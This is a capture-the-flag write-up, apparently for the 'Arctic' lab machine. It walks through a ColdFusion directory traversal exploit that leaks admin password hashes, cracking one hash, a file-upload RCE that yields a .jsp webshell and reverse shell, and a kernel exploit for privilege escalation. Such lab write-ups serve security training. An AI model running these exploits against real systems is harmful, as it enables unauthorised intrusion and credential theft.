## Arctic 

### Lab Details 

- Difficulty: Easy 
- Type: Web, ColdFusion, Priv Esc, Windows 

#### Tasks
Q1: On what TCP port is there an HTTP server running?
- nmap `nmap -sT -T4 -vv -A -p- -oA Arctic 10.10.10.11`

Q2: What is the web application development platform in use by the site?
- upon landing we are greeted with  `http://10.10.10.11:8500/CFIDE/`
- searching CFIDE result in ColdFusion 

Q3: What is the 2010 CVE ID for a directory traversal vulnerability in enter.cfm?
- CVE-2010-2861, searched for coldfusion directory traversal
- we can fetch the exploit using searchsploit and running it will give us admin password hash
```
$: searchsploit -m multiple/remote/14641.py
  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
    Codes: CVE-2010-2861, OSVDB-67047
 Verified: True
File Type: HTML document, ASCII text
Copied to: /home/kali/Obsidian/WriteUps/Easy/Windows/Arctic/14641.py

$: python2 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties 
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```


Q4: Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?
- load up `msfconsole` and search for Windows and Recon 
- example below
```
msf6 > search type:post platform:windows path:multi/recon

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  post/multi/recon/multiport_egress_traffic                   normal  No     Generate TCP/UDP Outbound Traffic On Multiple Ports
   1  post/multi/recon/local_exploit_suggester                    normal  No     Multi Recon Local Exploit Suggester
   2  post/multi/recon/reverse_lookup                             normal  No     Reverse Lookup IP Addresses

```

Q5: What is the password for the ColdFusion admin login?
- the cold fusion running on the server is version 8, hashcat only offer version 10+
- tried online tools to crack unable to find the plaintext
- used john to crack the hash 
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash         
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 ASIMD 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)     
1g 0:00:00:00 DONE (2025-05-25 16:21) 16.66g/s 85266p/s 85266c/s 85266C/s jodie..gabita
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

Q6: What kind of file can be uploaded to work as a webshell on Arctic?
- tried searching for a exploit for RCE or file upload using searchsploit
- found exploit 50057.py and found the POC is uploading a file with .jsp file
- example below
```
$: searchsploit coldfusion
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
<snip>
Adobe ColdFusion 8 - Remote Command Execution (RCE)                         | cfm/webapps/50057.py
<snip>
---------------------------------------------------------------------------- ---------------------------------

$: searchsploit -m cfm/webapps/50057.py  
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
    Codes: CVE-2009-2265
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Obsidian/WriteUps/Easy/Windows/Arctic/50057.py

$: cat 50057.py
<snip>
# Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00', data=data)
<snip>
```

Q7: What user is the webserver running as? Give the username without the domain.
- modified the script and running the script we get a reverse shell back as the user tolis
- can then use `type` to display the flag at C:/Users/tolis/Desktop/user.txt

Q8: Have any hotfixes been applied to this system?
- we can use `systeminfo` to gain info on hotfixes 
- output below
```
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          26/5/2025, 5:28:21 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 4.770 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 10.919 MB
Virtual Memory: In Use:    1.366 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```
- No hotfixs found 

Q10: Submit the flag located on the administrator's desktop.
- since no hotfixs found this machine is vulnerable to many kernel level exploits 
- we can try using MS10-059/Chimichurri, source of POC: https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri
- download the complied POC and transfer to machine
- execute the exe -> root shell 

#### Lesson Learned
- if unable to crack with hashcat try john
- msfconsole search capabilities 

